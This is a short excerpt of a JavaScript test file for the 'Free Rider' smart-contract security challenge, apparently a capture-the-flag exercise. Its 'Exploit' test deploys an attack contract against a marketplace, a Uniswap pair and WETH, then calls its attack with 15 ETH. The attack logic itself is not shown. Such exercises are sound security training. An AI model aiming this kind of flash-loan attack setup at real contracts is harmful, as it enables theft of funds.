...
describe('[Challenge] Free Rider', function () {
    ...
    it('Exploit', async function () {
        ...
        attackFreeRider = await (await ethers.getContractFactory('AttackFreeRider', deployer)).deploy(this.uniswapPair.address, this.marketplace.address, this.weth.address, this.nft.address, this.buyerContract.address);

        await attackFreeRider.connect(attacker).attack(ethers.utils.parseEther("15"));
    });
